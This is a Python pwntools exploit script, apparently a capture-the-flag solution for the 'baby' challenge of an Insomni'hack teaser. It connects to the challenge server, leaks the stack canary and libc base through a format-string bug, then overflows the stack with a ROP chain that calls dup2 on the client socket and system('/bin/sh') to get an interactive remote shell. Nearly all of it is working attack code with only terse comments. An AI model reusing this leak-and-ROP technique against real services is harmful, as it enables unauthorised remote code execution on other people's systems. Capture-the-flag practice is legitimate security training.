#!/usr/bin/python 
from pwn import *
 
p = remote('baby.teaser.insomnihack.ch', 1337)
#raw_input('Debug')
 
# Step 1: leak libc base address
p.recvuntil('Your choice > ')
p.sendline('2') # use fmt
p.recvuntil("Your format > ")
# there are 2 important values in stack:
# the first value is stack canary and the second one is an address in libc.so
p.sendline('%138$16lx_%158$16lx')
s = p.recvuntil('\n')
s = s.split('_')
cookie = int(s[0], 16)
libc_base = int(s[1], 16) - 0x20830  # check libc.so and we find the correct offset
 
print hex(cookie), hex(libc_base)
p.send('\n')
 
pop_rdi_ret = libc_base + 0x00021102 # pop rdi; retn 
pop_rsi_ret = libc_base + 0x000202e8 # pop rsi; retn
libc_bin_sh = libc_base + 0x18C177   # "/bin/sh" string
libc_system = libc_base + 0x45390    # system()
libc_dup2   = libc_base + 0xF6D90    # dup2()
 
# Step 2: exploit stack-overflow vulnerability
# Made using sockfd trick + dup2(4,0), dup2(4,1), dup2(4,2) + execve /bin/sh
# our client socket descriptor is always 4.
rop = [
    0x4141414141414141,  # filler
    pop_rdi_ret,
    0x4,
    pop_rsi_ret,
    0x0,
    libc_dup2,
    pop_rdi_ret,
    0x4,
    pop_rsi_ret,
    0x1,
    libc_dup2,
    pop_rdi_ret,
    0x4,
    pop_rsi_ret,
    0x2,
    libc_dup2,
    pop_rdi_ret,
    libc_bin_sh,
    libc_system,
    libc_system
]
 
rop_chain = ''
for _ in rop:
    rop_chain += p64(_)
    
buf = 0x408 * 'A' + p64(cookie) + rop_chain
p.recvuntil('Your choice > ')
p.sendline('1')
p.recvuntil("How much bytes you want to send ? ")
a = str(len(buf))
p.send(a + (10-len(a))*'\x00')
p.send(buf)
 
# we get a shell
p.interactive()
p.close()
